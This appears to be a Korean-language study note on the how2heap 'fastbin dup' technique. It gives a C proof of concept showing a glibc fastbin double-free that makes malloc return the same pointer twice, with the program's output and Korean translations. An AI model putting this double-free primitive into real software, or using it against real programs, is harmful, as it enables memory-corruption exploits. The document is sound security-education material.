# How2Heap Study 02 Fastbin Dup

## Tech Overview

Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.

## Source

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
}
```

## Output

```
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0xe99010
2nd malloc(8): 0xe99030
3rd malloc(8): 0xe99050
Freeing the first one...
If we free 0xe99010 again, things will crash because 0xe99010 is at the top of the free list.
So, instead, we'll free 0xe99030.
Now, we can free 0xe99010 again, since it's not the head of the free list.
Now the free list has [ 0xe99010, 0xe99030, 0xe99010 ]. If we malloc 3 times, we'll get 0xe99010 twice!
1st malloc(8): 0xe99010
2nd malloc(8): 0xe99030
3rd malloc(8): 0xe99010
```

## 개요 번역

Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.

`fastbin` 해제 목록(freelist)을 어뷰징(정당하지 않게 사용)하여 `malloc`이 이미 할당되있는 힙 청크의 포인터를 반환하게 하는 트릭이다.

## 출력 번역

```
This file demonstrates a simple double-free attack with fastbins.
이 파일은 fastbins 을 사용하여 간단한 double-free 공격을 시연한다.

Allocating 3 buffers.
3개의 버퍼를 할당한다.

1st malloc(8): 0xe99010
2nd malloc(8): 0xe99030
3rd malloc(8): 0xe99050

Freeing the first one...
첫 번째 버퍼를 해제한다.

If we free 0xe99010 again, things will crash because 0xe99010 is at the top of the free list.
만약 우리가 0xe99010(첫 번째에 할당했던 메모리) 를 한 번 더 해제하면, 이것이 해제 목록의 최상위에 있기에 오류가 난다.

So, instead, we'll free 0xe99030.
그 대신에, 우리는 0xe99030(두 번째에 할당했던 메모리) 를 해제한다.

Now, we can free 0xe99010 again, since it's not the head of the free list.
이제, 우리는 0xe99010(첫 번째로 할당했던 메모리) 가 해제 목록의 맨 앞에 있지 않기에 한 번 더 해제할 수 있다.

Now the free list has [ 0xe99010, 0xe99030, 0xe99010 ]. If we malloc 3 times, we'll get 0xe99010 twice!
이제 해제 목록에는 [ 0xe99010, 0xe99030, 0xe99010 ] 가 들어있다.
만약 우리가 메모리를 3 번 할당하면 우리는 0xe99010 를 두 번 얻을 것이다.

1st malloc(8): 0xe99010
2nd malloc(8): 0xe99030
3rd malloc(8): 0xe99010
```